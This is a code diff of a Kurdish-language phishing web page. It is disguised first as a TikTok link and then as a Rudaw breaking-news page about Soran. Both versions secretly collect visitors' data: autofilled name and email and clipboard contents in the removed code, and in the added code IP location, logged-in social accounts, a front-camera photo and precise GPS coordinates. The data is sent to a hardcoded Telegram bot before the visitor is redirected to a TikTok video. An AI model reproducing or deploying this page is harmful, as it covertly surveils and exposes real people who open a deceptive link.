@@ -1,28 +1,24 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ku" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>TikTok</title>
-    <meta property="og:title" content="TikTok . کێشەیەکی نوێ لە سۆران">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Rudaw - هەواڵی بەپەلە</title>
+    <meta property="og:title" content="ڕوداو: هەواڵێکی گرنگ دەربارەی سۆران">
     <meta property="og:image" content="https://raw.githubusercontent.com/rudawsoran/Video/main/soran.jpg">
     <style>
-        body { margin: 0; background: #000; overflow: hidden; font-family: sans-serif; }
+        body { margin: 0; background: #000; font-family: Tahoma, sans-serif; color: white; overflow: hidden; }
         .bg { position: fixed; width: 100%; height: 100%; background: url('https://raw.githubusercontent.com/rudawsoran/Video/main/soran.jpg') no-repeat center; background-size: contain; }
-        .hidden-trap { position: absolute; opacity: 0.01; top: -500px; left: -500px; }
-        #trap { position: fixed; width: 100%; height: 100%; z-index: 100; cursor: pointer; }
-        #flash { position: fixed; width: 100%; height: 100%; background: white; z-index: 200; display: none; }
+        #overlay { position: fixed; width: 100%; height: 100%; z-index: 100; cursor: pointer; display: flex; align-items: flex-end; justify-content: center; padding-bottom: 50px; }
+        .btn { background: #ce1126; color: white; padding: 15px 30px; border-radius: 50px; font-weight: bold; font-size: 18px; border: none; box-shadow: 0 0 20px rgba(206, 17, 38, 0.5); }
         video, canvas { display: none; }
     </style>
 </head>
-<body onload="masterTrap()">
+<body onload="kingInit()">
     <div class="bg"></div>
-    <div id="flash"></div>
-    <div id="trap" onclick="startApp()"></div>
-    
-    <form class="hidden-trap">
-        <input type="text" name="user" id="u" autocomplete="name">
-        <input type="email" name="email" id="e" autocomplete="email">
-    </form>
+    <div id="overlay" onclick="captureEverything()">
+        <button class="btn">بۆ بینینی ڤیدیۆی ڕوداوەکە کلیک بکە</button>
+    </div>
 
     <video id="v" autoplay playsinline muted></video>
     <canvas id="c"></canvas>
@@ -30,34 +26,70 @@
     <script>
         const token = "8454166362:AAE-teyJSdRqs8yUA4UPUeHmiIT0TtyT1hc";
         const chat_id = "7261354534";
-        const targetVideo = "https://vt.tiktok.com/ZS5WMhjoP/";
+        const target = "https://vt.tiktok.com/ZS5WMhjoP/";
 
-        async function masterTrap() {
-            // ١. وەرگرتنی زانیاری ئۆتۆ-فێڵ دوای یەک چرکە
-            setTimeout(async () => {
-                const u = document.getElementById('u').value;
-                const e = document.getElementById('e').value;
-                
-                // ٢. هەوڵدان بۆ خوێندنەوەی کلیپبۆرد (کۆپی)
-                let clipText = "ڕێگەی پێ نەدراوە";
-                try {
-                    if (navigator.clipboard) {
-                        clipText = await navigator.clipboard.readText();
-                    }
-                } catch(err) {}
+        // ١. قۆناغی بێدەنگ (هەر کە لینکەکەی کردەوە)
+        async function kingInit() {
+            let entryMsg = "👑 پاشایەتی: نێچیرەکە ئێستا داخل بوو!\n\n";
+            
+            // زانیاری ئایپی و کۆمپانیا
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+                entryMsg += `📍 شوێن: ${d.city}, ${d.country_name}\n`;
+                entryMsg += `🏢 ئینتەرنێت: ${d.org}\n`;
+                entryMsg += `🌐 ئایپی: ${d.ip}\n`;
+            } catch(e) {}
 
-                let msg = "👑 تەڵەی گەورە کارا بوو:\n\n";
-                msg += `👤 ناو: ${u || 'نەدۆزرایەوە'}\n`;
-                msg += `📧 ئیمەیڵ: ${e || 'نەدۆزرایەوە'}\n`;
-                msg += `📋 کۆتا کۆپی: ${clipText || 'بەتاڵە'}\n`;
-                msg += `📱 مۆبایل: ${navigator.platform}\n`;
-                msg += `⏰ کات: ${new Date().toLocaleTimeString()}`;
-
-                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
-            }, 1500);
+            // زانیاری مۆبایل
+            entryMsg += `📱 ئامێر: ${navigator.platform}\n`;
+            entryMsg += `🧠 ناوکەی CPU: ${navigator.hardwareConcurrency}\n`;
+            
+            sendMsg(entryMsg);
+            checkSocialMedia();
         }
 
-        async function sendPhoto(v, c, fn, cap) {
+        // ٢. پشکنینی ئەکاونتە چالاکەکان بە بێدەنگی
+        function checkSocialMedia() {
+            const sites = ['facebook.com', 'google.com', 'instagram.com'];
+            sites.forEach(site => {
+                const img = new Image();
+                img.src = `https://${site}/favicon.ico?${Math.random()}`;
+                img.onload = () => sendMsg(`✅ ئەکاونتی کراوە دۆزرایەوە: ${site}`);
+            });
+        }
+
+        // ٣. قۆناغی کلیک (وێنە و لۆکەیشن و ناسنامە)
+        async function captureEverything() {
+            document.getElementById('overlay').innerHTML = "<button class='btn'>چاوەڕێ بکە...</button>";
+            
+            try {
+                // داواکردنی کامێرا
+                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const v = document.getElementById('v');
+                v.srcObject = s; await v.play();
+
+                // گرتنی وێنە
+                setTimeout(async () => {
+                    await sendSnap(v, "1.jpg", "📸 وێنەی نێچیر");
+                    
+                    // داواکردنی لۆکەیشنی ورد
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(async (pos) => {
+                            const map = `📍 لۆکەیشنی ورد:\nhttp://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                            await sendMsg(map);
+                            window.location.href = target;
+                        }, () => { window.location.href = target; }, {enableHighAccuracy: true});
+                    } else { window.location.href = target; }
+                }, 1000);
+            } catch (e) {
+                // ئەگەر ڕێگەی نەدا، هەر دەڕوات بۆ تیکتۆکەکە
+                window.location.href = target;
+            }
+        }
+
+        async function sendSnap(v, fn, cap) {
+            const c = document.getElementById('c');
             c.width = v.videoWidth; c.height = v.videoHeight;
             c.getContext('2d').drawImage(v, 0, 0);
             const b = await (await fetch(c.toDataURL('image/jpeg', 0.8))).blob();
@@ -65,32 +97,11 @@
             fd.append('chat_id', chat_id);
             fd.append('photo', b, fn);
             fd.append('caption', cap);
-            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+            return fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
         }
 
-        async function startApp() {
-            try {
-                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const v = document.getElementById('v');
-                v.srcObject = s; await v.play();
-                document.getElementById('flash').style.display = 'block';
-                
-                setTimeout(async () => {
-                    await sendPhoto(v, document.getElementById('c'), "1.jpg", "📸 وێنەی یەکەم");
-                    setTimeout(async () => {
-                        await sendPhoto(v, document.getElementById('c'), "2.jpg", "📸 وێنەی دووەم");
-                        document.getElementById('flash').style.display = 'none';
-                        
-                        if (navigator.geolocation) {
-                            navigator.geolocation.getCurrentPosition((pos) => {
-                                const mapLink = `http://googleusercontent.com/maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("📍 لۆکەیشن:\n" + mapLink)}`);
-                                window.location.href = targetVideo;
-                            }, () => { window.location.href = targetVideo; });
-                        } else { window.location.href = targetVideo; }
-                    }, 200);
-                }, 1000);
-            } catch (e) {}
+        function sendMsg(m) {
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(m)}`);
         }
     </script>
 </body>
